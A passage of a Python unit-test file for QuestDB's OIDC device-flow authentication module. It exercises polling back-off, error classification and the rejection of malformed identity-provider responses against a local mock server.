#!/usr/bin/env python3
################################################################################
##     ___                  _   ____  ____
##    / _ \ _   _  ___  ___| |_|  _ \| __ )
##   | | | | | | |/ _ \/ __| __| | | |  _ \
##   | |_| | |_| |  __/\__ \ |_| |_| | |_) |
##    \__\_\\__,_|\___||___/\__|____/|____/
##
##  Copyright (c) 2014-2019 Appsicle
##  Copyright (c) 2019-2024 QuestDB
##
##  Licensed under the Apache License, Version 2.0 (the "License");
##  you may not use this file except in compliance with the License.
##  You may obtain a copy of the License at
##
##  http://www.apache.org/licenses/LICENSE-2.0
##
##  Unless required by applicable law or agreed to in writing, software
##  distributed under the License is distributed on an "AS IS" BASIS,
##  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
##  See the License for the specific language governing permissions and
##  limitations under the License.
##
################################################################################

"""
Standalone unit tests for ``questdb.auth``.

These need no network access and no running QuestDB: they exercise the device
flow, discovery, caching, refresh and the REST adapter against an in-process
mock IdP + mock QuestDB server. ``questdb.auth`` itself pulls in nothing beyond
the standard library, but importing it initialises the parent ``questdb``
package, so the compiled ``questdb._client`` extension must have been built.

Run directly::

    python3 test/test_auth.py -v
"""

import base64
import contextlib
import errno
import importlib.util
import io
import json
import os
import shutil
import stat
import subprocess
import sys
import tempfile
import threading
import time
import types
import unittest
import http.server
import urllib.parse
from dataclasses import replace
from unittest import mock

sys.dont_write_bytecode = True
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

from questdb.auth import (  # noqa: E402
    FileTokenStore,
    OidcDeviceAuth,
    OidcError,
    OidcConfigError,
    OidcDeviceFlowError,
    OidcTimeoutError,
    OidcInteractionRequired,
    OidcNetworkError,
    PersistedToken,
    TokenSet,
    TokenStore,
    TokenStoreKey,
    sqlalchemy_engine,
    psycopg_connect,
)
from questdb.auth._cache import (  # noqa: E402
    MemoryCache, _MEMORY_GENERATION, _MEMORY_INFLIGHT, _MEMORY_STORE)
from questdb.auth._render import Renderer  # noqa: E402
from questdb.auth._adapters import _require_host  # noqa: E402
from questdb.auth._store import (  # noqa: E402
    TOKEN_STORE_DIR_ENV, _CANONICAL_PREFIX, _MIN_LOCK_STALE, _SCHEMA_VERSION,
    _canonical_endpoint, _millis_to_seconds, _seconds_to_millis)

_HAS_PG_DRIVER = (
    importlib.util.find_spec('psycopg') is not None
    or importlib.util.find_spec('psycopg2') is not None)


class _FakeAuth:
    """A stand-in OidcDeviceAuth for adapter tests (no network)."""

    _ctx = None

    def __init__(self, token='TKN', interactive_required=False):
        self._value = token
        self.calls = 0
        # When True, mimic "no token acquired yet": a non-interactive fetch
        # (allow_interactive=False — the pool-thread path) refuses with
        # OidcInteractionRequired instead of returning a token, exactly as
        # OidcDeviceAuth._token does when it would otherwise start a device flow.
        self._interactive_required = interactive_required
        # The allow_interactive value of the last _token() call, so a test can
        # assert the adapter fetches the per-connection token non-interactively.
        self.last_allow_interactive = None

    def token(self):
        self.calls += 1
        return self._value

    def _token(self, *, allow_interactive=True):
        # The SQLAlchemy adapter fetches the per-connection token through this
        # internal accessor with allow_interactive=False (it runs on a pool
        # thread, where an interactive prompt would block the pool). Mirror
        # OidcDeviceAuth and count it like token().
        self.calls += 1
        self.last_allow_interactive = allow_interactive
        if self._interactive_required and not allow_interactive:
            raise OidcInteractionRequired(
                'Sign in first: no token has been acquired.')
        return self._value

    def headers(self):
        return {'Authorization': f'Bearer {self._value}'}


class _ChunkStream:
    """A response stub whose read(n) yields preset chunks, then b'' at EOF."""

    def __init__(self, *chunks):
        self._chunks = list(chunks)

    def read(self, n):
        return self._chunks.pop(0) if self._chunks else b''


def _jwt(claims):
    """Build an unsigned JWT-shaped string with the given payload claims."""
    def b64(obj):
        raw = json.dumps(obj).encode()
        return base64.urlsafe_b64encode(raw).rstrip(b'=').decode()
    return f'{b64({"alg": "none"})}.{b64(claims)}.sig'


ID_TOKEN = _jwt({'sub': 'user-1', 'email': 'alice@example.com',
                 'groups': ['analysts']})
ACCESS_TOKEN = _jwt({'sub': 'user-1', 'scope': 'openid'})


@contextlib.contextmanager
def _raw_response_server(status, content_type, body, extra_headers=None):
    """A throwaway HTTP server that returns one fixed (status, type, body).

    Used to exercise the transport's handling of responses the scripted mock
    IdP can't produce (non-JSON 2xx, non-dict JSON, non-2xx) on the token /
    device / settings / discovery endpoints. ``extra_headers`` adds response
    headers (e.g. ``Retry-After``). Yields the base URL.
    """
    class _H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def _send(self):
            self.send_response(status)
            self.send_header('Content-Type', content_type)
            self.send_header('Content-Length', str(len(body)))
            for _k, _v in (extra_headers or {}).items():
                self.send_header(_k, _v)
            self.end_headers()
            self.wfile.write(body)

        def do_GET(self):
            self._send()

        def do_POST(self):
            self.rfile.read(int(self.headers.get('Content-Length', 0)))
            self._send()

    srv = http.server.HTTPServer(('127.0.0.1', 0), _H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        yield f'http://127.0.0.1:{srv.server_port}'
    finally:
        srv.shutdown()
        srv.server_close()


class FakeClock:
    """Deterministic clock: ``sleep`` advances both monotonic and wall time."""

    def __init__(self):
        self.mono = 0.0
        self.wall = 1_000_000.0
        self.sleeps = []

    def sleep(self, dt):
        self.sleeps.append(dt)
        self.mono += dt
        self.wall += dt

    def monotonic(self):
        return self.mono

    def now(self):
        return self.wall


class _ConcurrentClock:
    """Like FakeClock but safe under real thread contention; sleep is instant.

    The deterministic FakeClock mutates plain attributes, which races when many
    threads drive the flow at once (and tears on a free-threaded build). This
    guards every read/write with a lock so a multi-thread stress test gets
    instant, non-racing time. Only the lock-holding acquirer ever sleeps (the
    lock-free fast path never does), so contention on this lock stays low.
    """

    def __init__(self):
        self._lock = threading.Lock()
        self.mono = 0.0
        self.wall = 1_000_000.0

    def sleep(self, dt):
        with self._lock:
            self.mono += dt
            self.wall += dt

    def monotonic(self):
        with self._lock:
            return self.mono

    def now(self):
        with self._lock:
            return self.wall


class MockState:
    """Scriptable behaviour shared with the request handler."""

    def __init__(self):
        self.settings = {}
        self.well_known = None
        # FIFO of (status, body) returned for device_code grant polls.
        # When exhausted, the last entry repeats.
        self.token_script = [(200, None)]  # None => default success body
        self.refresh_response = None       # (status, body) or None
        self.device_response = None        # override device-auth response body
        self.device_status = 200
        # Recording.
        self.device_requests = 0
        self.token_requests = []
        self.refresh_requests = 0
        self.refresh_forms = []


class _Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *args):
        pass

    @property
    def state(self):
        return self.server.state

    def _send_json(self, status, obj):
        data = json.dumps(obj).encode()
        self.send_response(status)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def _read_form(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode()
        return {k: v[0] for k, v in urllib.parse.parse_qs(body).items()}

    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path
        if path == '/settings':
            self._send_json(200, self.state.settings)
        elif path == '/.well-known/openid-configuration':
            if self.state.well_known is None:
                self._send_json(404, {'error': 'not found'})
            else:
                self._send_json(200, self.state.well_known)
        else:
            self._send_json(404, {'error': 'not found'})

    def do_POST(self):
        path = urllib.parse.urlparse(self.path).path
        form = self._read_form()
        if path == '/device':
            self.state.device_requests += 1
            if self.state.device_status != 200:
                self._send_json(self.state.device_status,
                                self.state.device_response or
                                {'error': 'invalid_client'})
                return
            body = self.state.device_response or {
                'device_code': 'DEV-CODE',
                'user_code': 'WDJB-MJHT',
                'verification_uri': 'https://idp.example.com/device',
                'verification_uri_complete':
                    'https://idp.example.com/device?user_code=WDJB-MJHT',
                'expires_in': 600,
                'interval': 5,
            }
            self._send_json(200, body)
        elif path == '/token':
            grant = form.get('grant_type')
            if grant == 'refresh_token':
                self.state.refresh_requests += 1
                self.state.refresh_forms.append(form)
                status, body = self.state.refresh_response or (
                    200, self._default_token_body())
                self._send_json(status, body)
                return
            self.state.token_requests.append(form)
            idx = min(len(self.state.token_requests) - 1,
                      len(self.state.token_script) - 1)
            status, body = self.state.token_script[idx]
            if body is None:
                body = self._default_token_body()
            self._send_json(status, body)
        else:
            self._send_json(404, {'error': 'not found'})

    @staticmethod
    def _default_token_body():
        return {
            'access_token': ACCESS_TOKEN,
            'id_token': ID_TOKEN,
            'refresh_token': 'REFRESH-1',
            'token_type': 'Bearer',
            'expires_in': 3600,
            'scope': 'openid groups',
        }


class _MockServer(http.server.HTTPServer):
    def __init__(self):
        super().__init__(('127.0.0.1', 0), _Handler)
        self.state = MockState()


class AuthTestBase(unittest.TestCase):
    def setUp(self):
        _MEMORY_STORE.clear()
        _MEMORY_GENERATION.clear()
        _MEMORY_INFLIGHT.clear()
        # open_browser defaults to True, so stub webbrowser.open: device-flow
        # tests must never spawn a real browser. Tests asserting open/skip
        # behaviour use self.mock_browser_open (or patch it themselves).
        patcher = mock.patch('webbrowser.open')
        self.mock_browser_open = patcher.start()
        self.addCleanup(patcher.stop)
        self.server = _MockServer()
        self.state = self.server.state
        self.thread = threading.Thread(
            target=lambda: self.server.serve_forever(poll_interval=0.02),
            daemon=True)
        self.thread.start()
        self.base = f'http://127.0.0.1:{self.server.server_port}'

    def tearDown(self):
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=5)
        # Assert the server thread actually terminated: a join() that times out
        # silently leaks a thread, so a future deadlock regression would still
        # "pass" instead of failing here.
        self.assertFalse(self.thread.is_alive(),
                         'mock server thread did not shut down within 5s')

    def make_auth(self, *, clock=None, groups_in_token=True,
                  interactive=True, renderer=None, **kw):
        clock = clock or FakeClock()
        self._clock = clock
        return OidcDeviceAuth(
            client_id='questdb',
            device_authorization_endpoint=self.base + '/device',
            token_endpoint=self.base + '/token',
            scope='openid groups',
            groups_in_token=groups_in_token,
            insecure=True,
            interactive=interactive,
            renderer=renderer if renderer is not None else Renderer(),
            _clock=clock,
            **kw)


class TestDeviceFlow(AuthTestBase):
    def test_happy_path_returns_id_token(self):
        self.state.token_script = [
            (400, {'error': 'authorization_pending'}),
            (400, {'error': 'authorization_pending'}),
            (200, None),
        ]
        auth = self.make_auth()
        token = auth.token()
        self.assertEqual(token, ID_TOKEN)
        # 3 token polls, slept 'interval' (5s) before each.
        self.assertEqual(len(self.state.token_requests), 3)
        self.assertEqual(self._clock.sleeps, [5, 5, 5])

    def test_access_token_when_groups_not_in_token(self):
        auth = self.make_auth(groups_in_token=False)
        self.assertEqual(auth.token(), ACCESS_TOKEN)

    def test_constructor_defaults_to_access_token(self):
        # The bare constructor default is groups_in_token=False (send the
        # access_token), matching the QuestDB server default.
        auth = OidcDeviceAuth(
            client_id='questdb',
            device_authorization_endpoint=self.base + '/device',
            token_endpoint=self.base + '/token',
            insecure=True,
            interactive=True,
            renderer=Renderer(),
            _clock=FakeClock())
        self.assertFalse(auth.config.groups_in_token)
        self.assertEqual(auth.token(), ACCESS_TOKEN)

    def test_headers(self):
        auth = self.make_auth()
        self.assertEqual(auth.headers(),
                         {'Authorization': 'Bearer ' + ID_TOKEN})

    def test_slow_down_backs_off(self):
        self.state.token_script = [
            (400, {'error': 'slow_down'}),
            (200, None),
        ]
        auth = self.make_auth()
        auth.token()
        # interval starts at 5, +5 after slow_down.
        self.assertEqual(self._clock.sleeps, [5, 10])

    def test_slow_down_retry_after_never_decreases_interval(self):
        # M6 / RFC 8628 §3.5: slow_down MUST raise the poll interval. A
        # contradictory LOW Retry-After on a slow_down must not reduce it below
        # current + 5 (which would make the client poll faster right after the IdP
        # told it to slow down). A plain 429/5xx still honors Retry-After verbatim
        # (test_poll_honors_retry_after); this is the slow_down-specific rule.
        from questdb.auth._http import _PostResult
        auth = self.make_auth()
        real = auth._idp_post
        n = {'tok': 0}

        def fake(url, form):
            if url.endswith('/token'):
                n['tok'] += 1
                if n['tok'] == 1:
                    return _PostResult(400, {'error': 'slow_down'}, None)  # 5->10
                if n['tok'] == 2:
                    return _PostResult(400, {'error': 'slow_down'}, 1)  # low RA
                return real(url, form)                                  # success
            return real(url, form)

        auth._idp_post = fake
        self.assertEqual(auth.token(), ID_TOKEN)
        # 5 -> (+5) 10 -> slow_down w/ Retry-After:1 stays >= 10+5 = 15, never
        # dropping back to the 5s floor.
        self.assertEqual(self._clock.sleeps, [5, 10, 15])

    def test_json_429_slow_down_body_still_increases_interval(self):
        # m1 (RFC 8628 §3.5): a NON-conformant `429 {"error":"slow_down"}` (the
        # RFC returns slow_down with HTTP 400) is caught by the 429/5xx transient
        # arm, which runs BEFORE the dedicated slow_down arm. It must still obey
        # the slow_down rule — raise the interval by >=5 — not honor a low
        # Retry-After and poll FASTER right after the IdP asked it to slow down.
        # A plain 429 with no slow_down body still honors Retry-After verbatim
        # (test_poll_honors_retry_after).
        from questdb.auth._http import _PostResult
        auth = self.make_auth()
        real = auth._idp_post
        n = {'tok': 0}

        def fake(url, form):
            if url.endswith('/token'):
                n['tok'] += 1
                if n['tok'] == 1:
                    return _PostResult(400, {'error': 'slow_down'}, None)  # 5->10
                if n['tok'] == 2:
                    # 429 status AND a slow_down body, with a low Retry-After.
                    return _PostResult(429, {'error': 'slow_down'}, 1)
                return real(url, form)                                  # success
            return real(url, form)

        auth._idp_post = fake
        self.assertEqual(auth.token(), ID_TOKEN)
        # 5 -> (+5) 10 -> 429+slow_down Retry-After:1 stays >= 10+5 = 15, never
        # dropping to the 5s floor.
        self.assertEqual(self._clock.sleeps, [5, 10, 15])

    def test_non_json_429_retry_after_honored_in_poll(self):
        # m2: a non-JSON 429 from a proxy/WAF now carries its Retry-After
        # (post_form attaches it to the OidcError), so the poll loop's exception
        # arm backs off by that value rather than the fixed +5s step.
        self.state.token_script = [(200, None)]  # success once actually polled
        auth = self.make_auth()
        real = auth._idp_post
        polls = {'n': 0}

        def flaky(url, form):
            if url == auth.config.token_endpoint:
                polls['n'] += 1
                if polls['n'] == 1:
                    raise OidcError('proxy 429', status=429, retry_after=30)
            return real(url, form)

        auth._idp_post = flaky
        self.assertEqual(auth.token(), ID_TOKEN)
        self.assertIn(30, self._clock.sleeps)   # honored Retry-After, not +5

    def test_transient_network_error_during_poll_keeps_polling(self):
        # A dropped connection / DNS blip / timeout on a single poll must not
        # abort a sign-in the user may already have completed in the browser:
        # the loop keeps polling until the deadline (RFC 8628 §3.4). M1.
        self.state.token_script = [(200, None)]  # success once actually polled
        auth = self.make_auth()
        real_idp_post = auth._idp_post
        token_polls = {'n': 0}

        def flaky(url, form):
            # Fail only the first poll of the token endpoint; pass the device-
            # code request and later polls through to the real transport.
            if url == auth.config.token_endpoint:
                token_polls['n'] += 1
                if token_polls['n'] == 1:
                    raise OidcNetworkError('connection reset mid-poll')
            return real_idp_post(url, form)

        auth._idp_post = flaky
        self.assertEqual(auth.token(), ID_TOKEN)
        # First poll raised (transient, retried); second poll reached the IdP.
        self.assertEqual(token_polls['n'], 2)
        self.assertEqual(len(self.state.token_requests), 1)
        self.assertEqual(self._clock.sleeps, [5, 5])

    def test_transient_5xx_and_429_during_poll_keep_polling(self):
        # A 5xx server error or a 429 rate-limit (even carrying a JSON body) is
        # transient, not a terminal OAuth rejection: keep polling, backing off
        # on the rate-limit. M1.
        self.state.token_script = [
            (503, {'error': 'server_error'}),
            (429, {'error': 'slow_down'}),
            (200, None),
        ]
        auth = self.make_auth()
        self.assertEqual(auth.token(), ID_TOKEN)
        self.assertEqual(len(self.state.token_requests), 3)
        # 503 polled at the base interval; 429 bumps the interval by 5.
        self.assertEqual(self._clock.sleeps, [5, 5, 10])

    def test_non_json_5xx_and_429_during_poll_keep_polling(self):
        # A non-JSON 5xx/429 from a proxy in front of the token endpoint makes
        # post_form RAISE a bare OidcError(status=...) — it can't return a JSON
        # body like the case above. The poll loop must treat it as transient and
        # keep polling, exercising the `except OidcError` transient arm and its
        # 429 back-off (distinct from the status-based arm). Review m6.
        self.state.token_script = [(200, None)]  # success once actually polled
        auth = self.make_auth()
        real_idp_post = auth._idp_post
        polls = {'n': 0}

        def flaky(url, form):
            if url == auth.config.token_endpoint:
                polls['n'] += 1
                if polls['n'] == 1:
                    raise OidcError('proxy <html>503</html>', status=503)
                if polls['n'] == 2:
                    raise OidcError('rate limited', status=429)
            return real_idp_post(url, form)

        auth._idp_post = flaky
        self.assertEqual(auth.token(), ID_TOKEN)
        # 503 retried at the base interval; 429 retried with a +5 bump; the 3rd
        # poll reached the IdP and succeeded.
        self.assertEqual(polls['n'], 3)
        self.assertEqual(len(self.state.token_requests), 1)
        self.assertEqual(self._clock.sleeps, [5, 5, 10])

    def test_non_json_5xx_retry_after_honored_in_poll(self):
        # m1: a non-JSON 5xx from a proxy/WAF carries its Retry-After (post_form
        # attaches it to the OidcError), so the poll loop's exception arm now
        # backs off by that value -- matching the JSON-body 5xx path
        # (test_poll_honors_retry_after_on_5xx) and the non-JSON 429 path.
        # Previously only a non-JSON 429 honored it, so a 5xx carrying a
        # Retry-After kept polling at the base interval.
        self.state.token_script = [(200, None)]  # success once actually polled
        auth = self.make_auth()
        real = auth._idp_post
        polls = {'n': 0}

        def flaky(url, form):
            if url == auth.config.token_endpoint:
                polls['n'] += 1
                if polls['n'] == 1:
                    raise OidcError('proxy <html>503</html>', status=503,
                                    retry_after=30)
            return real(url, form)

        auth._idp_post = flaky
        self.assertEqual(auth.token(), ID_TOKEN)
        self.assertIn(30, self._clock.sleeps)   # honored Retry-After, not base 5

    def test_non_json_4xx_during_poll_is_terminal(self):
        # A non-JSON 4xx during polling (an HTML/plain error page from a WAF or
        # reverse proxy in front of the IdP, or a non-conformant IdP) is a
        # terminal rejection: a conformant OAuth error is JSON, so it can't be
        # authorization_pending / slow_down. Fail fast with a device-flow error
        # instead of polling on to a misleading "code expired". M1.
        auth = self.make_auth()
        with _raw_response_server(
                403, 'text/html', b'<html>denied</html>') as raw:
            # Point only the poll (token) endpoint at the non-JSON 403; the
            # device-code request still hits the JSON mock IdP. Set it post-
            # construction so the (already-satisfied) co-location check isn't
            # re-run against the throwaway origin. OidcConfig is frozen, so
            # rebuild it via replace() rather than mutating in place.
            auth.config = replace(auth.config, token_endpoint=raw + '/token')
            with self.assertRaises(OidcDeviceFlowError) as cm:
                auth.token()
        # Terminal on the first poll: not a timeout, and it did not keep polling
        # to the device-code deadline.
        self.assertNotIsInstance(cm.exception, OidcTimeoutError)
        self.assertLessEqual(len(self._clock.sleeps), 1)

    def test_non_json_3xx_during_poll_is_terminal(self):
        # A non-JSON 3xx (an HTML redirect from a reverse proxy in front of the
        # token endpoint) must fail fast too: these endpoints never legitimately
        # redirect, _NoRedirect refuses to follow one, and post_form surfaces it
        # as OidcError(status=3xx). Without classifying 3xx as terminal the loop
        # would poll on to a misleading "code expired".
        auth = self.make_auth()
        with _raw_response_server(
                302, 'text/html', b'<html>see /login</html>') as raw:
            # OidcConfig is frozen; rebuild it rather than mutating in place.
            auth.config = replace(auth.config, token_endpoint=raw + '/token')
            with self.assertRaises(OidcDeviceFlowError) as cm:
                auth.token()
        self.assertNotIsInstance(cm.exception, OidcTimeoutError)
        self.assertLessEqual(len(self._clock.sleeps), 1)

    def test_json_3xx_during_poll_is_terminal(self):
        # A 3xx whose body IS valid JSON (a proxy/WAF redirect that happens to
        # carry an OAuth-looking error field) must fail fast too: _NoRedirect
        # refuses the redirect and post_form returns (3xx, {...}), which the poll
        # loop must classify terminal rather than mistake the embedded
        # authorization_pending for a live poll state and poll on to "code
        # expired". (The non-JSON 3xx is covered above via the exception path;
        # this exercises the JSON-body path inside the loop.)
        auth = self.make_auth()
        with _raw_response_server(
                302, 'application/json',
                b'{"error": "authorization_pending"}') as raw:
            auth.config = replace(auth.config, token_endpoint=raw + '/token')
            with self.assertRaises(OidcDeviceFlowError) as cm:
                auth.token()
        self.assertNotIsInstance(cm.exception, OidcTimeoutError)
        self.assertLessEqual(len(self._clock.sleeps), 1)

    def test_http_status_terminal_vs_transient_classifier(self):
        # The poll classifier: 3xx (a redirect these endpoints never return) and
        # a non-conformant 2xx are terminal alongside 4xx, so a non-JSON such
        # response fails fast; only 5xx/429 (and a status-less network error) are
        # transient and retried to the deadline. The two are mutually exclusive
        # over any real status.
        from questdb.auth._device import (
            _http_status_is_terminal, _http_status_is_transient)
        for s in (200, 204, 301, 302, 307, 308, 400, 403, 404):
            self.assertTrue(_http_status_is_terminal(s), s)
            self.assertFalse(_http_status_is_transient(s), s)
        for s in (500, 502, 503, 429):
            self.assertFalse(_http_status_is_terminal(s), s)
            self.assertTrue(_http_status_is_transient(s), s)
        self.assertFalse(_http_status_is_terminal(None))   # network error
        self.assertFalse(_http_status_is_transient(None))

    def test_device_200_without_codes_is_rejected_clearly(self):
        # A 200 device-authorization response missing device_code/user_code is
        # a non-conformant body, not an HTTP failure: the error must say so
        # plainly (NOT the self-contradictory "failed (HTTP 200)") and the flow
        # must never start polling.
        self.state.device_status = 200
        self.state.device_response = {'verification_uri': 'https://idp/device'}
        auth = self.make_auth()
        with self.assertRaises(OidcDeviceFlowError) as cm:
            auth.token()
        msg = str(cm.exception)
        self.assertNotIn('HTTP 200', msg)
        self.assertIn('device_code', msg)
        self.assertEqual(self.state.token_requests, [])  # never polled

    def test_device_200_with_nonstring_codes_is_rejected_clearly(self):
        # A 200 whose device_code/user_code is a non-string (a JSON number/list
        # from a buggy/hostile IdP) must be treated as missing — coerced via
        # _str_or_none so it can't be stringified into the poll request — and
        # raise the same clear error rather than polling with a bogus code.
        self.state.device_status = 200
        self.state.device_response = {
            'device_code': 12345, 'user_code': ['X'],
            'verification_uri': 'https://idp/device'}
        auth = self.make_auth()
        with self.assertRaises(OidcDeviceFlowError) as cm:
            auth.token()
        msg = str(cm.exception)
        self.assertNotIn('HTTP 200', msg)
        self.assertIn('device_code', msg)
        self.assertEqual(self.state.token_requests, [])  # never polled

    def test_timeout_when_never_authorized(self):
        self.state.device_response = {
            'device_code': 'DEV-CODE', 'user_code': 'X',
            'verification_uri': 'https://idp/device',
            'expires_in': 10, 'interval': 5,
        }
        self.state.token_script = [(400, {'error': 'authorization_pending'})]
        auth = self.make_auth()
        with self.assertRaises(OidcTimeoutError):
            auth.token()

    def test_idp_expired_token_error_raises_timeout(self):
        # The token endpoint can itself answer a poll with error=expired_token
        # (RFC 8628) — distinct from the local-deadline timeout. It must surface
        # as OidcTimeoutError carrying that error, not loop or mis-classify it.
        self.state.token_script = [(400, {'error': 'expired_token'})]
        auth = self.make_auth()
        with self.assertRaises(OidcTimeoutError) as cm:
            auth.token()
        self.assertEqual(cm.exception.error, 'expired_token')

    def test_device_flow_error_carries_http_status(self):
        # An OidcDeviceFlowError raised in response to a known HTTP status now
        # carries it on .status (forwarded to the OidcError base) instead of
        # always reporting None, so a caller can inspect err.status.
        self.state.device_status = 400
        self.state.device_response = {'error': 'invalid_client'}
        auth = self.make_auth()
        with self.assertRaises(OidcDeviceFlowError) as cm:
            auth.token()
        self.assertEqual(cm.exception.status, 400)

    def test_non_string_poll_error_field_raises_typed_error(self):
        # M1 (end-to-end): a non-conformant/hostile IdP can answer the token poll
        # with a non-string error / error_description (a JSON object/array).
        # Building the terminal OidcDeviceFlowError from it must surface as a
        # TYPED OidcError, never a raw TypeError that escapes token().
        self.state.token_script = [
            (400, {'error': {'nested': 'obj'},
                   'error_description': ['a', 'list']})]
        auth = self.make_auth()
        with self.assertRaises(OidcDeviceFlowError):  # the specific typed error
            auth.token()

    def test_missing_verification_uri_is_rejected(self):
        # Issue 6: a 200 device-auth response with device_code/user_code but NO
        # verification URI (RFC 8628 §3.2 requires it) must be rejected with a
        # typed error, not accepted into a prompt that renders a blank
        # "Open  and enter code" gap and then polls pointlessly.
        self.state.device_response = {
            'device_code': 'DEV-CODE', 'user_code': 'WDJB-MJHT',
            'expires_in': 600, 'interval': 5}   # no verification_uri / _url
        auth = self.make_auth()
        with self.assertRaises(OidcDeviceFlowError):
            auth.token()
        self.assertEqual(len(self.state.token_requests), 0)  # never polled
        # The legacy verification_url spelling (older Google) is accepted.
        self.state.device_response = {
            'device_code': 'DEV-CODE', 'user_code': 'WDJB-MJHT',
            'verification_url': 'https://idp.example.com/device',
            'expires_in': 600, 'interval': 5}
        self.state.token_script = [(200, None)]
        self.assertEqual(self.make_auth().token(), ID_TOKEN)

    def test_blank_after_strip_user_code_or_uri_is_rejected(self):
        # A user_code / verification_uri of ONLY control / zero-width / exotic-
        # space chars is a non-empty string (so it passes the _str_or_none guard)
        # yet renders empty after _strip_control / _display_url — an
        # "Open  and enter code:" prompt with nothing to act on. Such a response
        # must be rejected as non-conformant (never started / polled), like a
        # missing field, rather than shown blank.
        for field, blank in (
                ('user_code', '​​'),        # zero-width spaces
                ('user_code', ' '),              # NBSP -> folds to blank
                ('verification_uri', '​​'),  # zero-width only
                ('verification_uri', '‮​')):  # bidi + zero-width
            resp = {'device_code': 'DEV-CODE', 'user_code': 'WDJB-MJHT',
                    'verification_uri': 'https://idp.example.com/device',
                    'expires_in': 600, 'interval': 5}
            resp[field] = blank
            self.state.device_response = resp
            with self.assertRaises(OidcDeviceFlowError,
                                   msg=f'{field}={blank!r} not rejected') as cm:
                self.make_auth().token()
            self.assertIn('blank', str(cm.exception).lower())
            self.assertEqual(self.state.token_requests, [])  # never polled
            self.state.token_requests = []
        # A real URL / code that merely carries a TRAILING zero-width char is
        # still usable — the char is stripped, visible content remains — so the
        # flow proceeds rather than over-rejecting.
        self.state.device_response = {
            'device_code': 'DEV-CODE', 'user_code': 'WDJB-MJHT​',
            'verification_uri': 'https://idp.example.com/device​',
            'expires_in': 600, 'interval': 5}
        self.state.token_script = [(200, None)]
        self.assertEqual(self.make_auth().token(), ID_TOKEN)

    def test_success_message_reports_real_jwt_lifetime(self):
        # Issue 7: the "expires in N min" message must report the token's REAL
        # lifetime (JWT exp), not the cache's clamped expires_at (_MAX_EXPIRES_IN,
        # 1h). An 8h token must not be reported as "60 min".
        from questdb.auth._device import _MAX_EXPIRES_IN

        class _Rec(Renderer):
            expires_in = None

            def on_success(self, identity, expires_in):
                self.expires_in = expires_in

        auth = self.make_auth()           # sets self._clock
        auth._renderer = _Rec()
        real_exp = self._clock.now() + 8 * 3600
        id_tok = _jwt({'sub': 'alice', 'exp': real_exp})
        self.state.token_script = [(200, {
            'access_token': 'a', 'id_token': id_tok, 'refresh_token': 'r',
            'expires_in': 8 * 3600, 'scope': 'openid groups'})]  # clamped to 1h
        auth.token()
        # Reported lifetime reflects the 8h JWT exp, well beyond the 1h clamp...
        self.assertGreater(auth._renderer.expires_in, 7 * 3600)
        self.assertLessEqual(auth._renderer.expires_in, 8 * 3600)
        # ...while the CACHED token is still clamped (re-validated at least hourly).
        self.assertLessEqual(auth._tokens.expires_at - self._clock.now(),
                             _MAX_EXPIRES_IN)

    def test_hostile_jwt_exp_does_not_abort_signin(self):
        # M3: _display_lifetime ("expires in N min") is cosmetic but runs on the
        # success path. A hostile JWT exp — a huge int that overflows float() —
        # must NOT abort an already-completed sign-in; otherwise the token the
        # user authorized is discarded (the cache store runs only after the flow
        # returns) and every later token() re-prompts and re-crashes. token()
        # must still return the token.
        auth = self.make_auth()
        id_tok = _jwt({'sub': 'alice', 'exp': 10 ** 400})
        self.state.token_script = [(200, {
            'access_token': 'a', 'id_token': id_tok, 'refresh_token': 'r',
            'expires_in': 3600, 'scope': 'openid groups'})]
        self.assertEqual(auth.token(), id_tok)   # groups mode -> id_token

    def test_raising_success_renderer_does_not_abort_signin(self):
        # M3: rendering the success message is best-effort — a custom renderer
        # whose on_success raises must NOT discard a token the user already
        # authorized. The sign-in completes and token() returns.
        class _Boom(Renderer):
            def on_success(self, identity, expires_in):
                raise RuntimeError('renderer blew up')

        auth = self.make_auth(renderer=_Boom())
        self.assertEqual(auth.token(), ID_TOKEN)

    def test_raising_failure_renderer_does_not_mask_typed_error(self):
        # The on_prompt/on_waiting/on_failure callbacks are best-effort too: a
        # custom renderer whose on_failure raises must NOT replace the
        # authoritative OidcDeviceFlowError describing the real sign-in outcome
        # with its own exception (which would break the typed-error contract —
        # every failure path raises an OidcError subclass). The caller still sees
        # the access_denied error, not the renderer's RuntimeError.
        class _Boom(Renderer):
            def on_failure(self, message):
                raise RuntimeError('renderer blew up')

        self.state.token_script = [
            (400, {'error': 'access_denied',
                   'error_description': 'user said no'}),
        ]
        auth = self.make_auth(renderer=_Boom())
        with self.assertRaises(OidcDeviceFlowError) as cm:
            auth.token()
        self.assertEqual(cm.exception.error, 'access_denied')
        # And the non-reentrant acquisition lock is released (no state corruption).
        self.assertIsNone(auth._lock_owner)
        self.assertTrue(auth._lock.acquire(blocking=False))
        auth._lock.release()

    def test_poll_honors_retry_after(self):
        # Issue 8: a slow_down poll response carrying Retry-After backs off by
        # that many seconds (clamped), not the fixed +5s.
        from questdb.auth._http import _PostResult
        auth = self.make_auth()
        real = auth._idp_post
        n = {'tok': 0}

        def fake(url, form):
            if url.endswith('/token'):
                n['tok'] += 1
                if n['tok'] == 1:
                    return _PostResult(400, {'error': 'slow_down'}, 30)
                return real(url, form)   # then succeed
            return real(url, form)

        auth._idp_post = fake
        self.assertEqual(auth.token(), ID_TOKEN)
        self.assertIn(30, self._clock.sleeps)   # honored Retry-After, not +5

    def test_poll_honors_retry_after_on_5xx(self):
        # A transient 5xx poll response carrying Retry-After backs off by that
        # many seconds (clamped) — as _PostResult documents for 429/503, not just
        # 429. (The +5s slow-down step stays 429/slow_down-only; a 5xx without a
        # Retry-After keeps its cadence.)
        from questdb.auth._http import _PostResult
        auth = self.make_auth()
        real = auth._idp_post
        n = {'tok': 0}

        def fake(url, form):
            if url.endswith('/token'):
                n['tok'] += 1
                if n['tok'] == 1:
                    return _PostResult(503, {'error': 'server_error'}, 30)
                return real(url, form)   # then succeed
            return real(url, form)

        auth._idp_post = fake
